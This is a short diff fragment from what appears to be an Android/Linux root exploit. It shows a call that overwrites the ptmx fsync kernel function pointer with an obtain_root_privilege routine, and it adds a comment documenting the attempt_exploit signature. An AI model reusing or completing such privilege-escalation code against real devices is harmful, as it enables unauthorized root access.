@@ -221,6 +221,15 @@ run_exploit(void)
   return attempt_exploit(ptmx_fops_fsync_address,
                          (unsigned long int)&obtain_root_privilege, 0,
                          run_obtain_root_privilege, NULL);
+/*
+ from libexploit/exploit.c
+ 
+ attempt_exploit(unsigned long int address,
+ unsigned long int write_value,
+ unsigned long int restore_value,
+ exploit_callback_t callback_func,
+ void *callback_param)
+*/
 }
 
 void
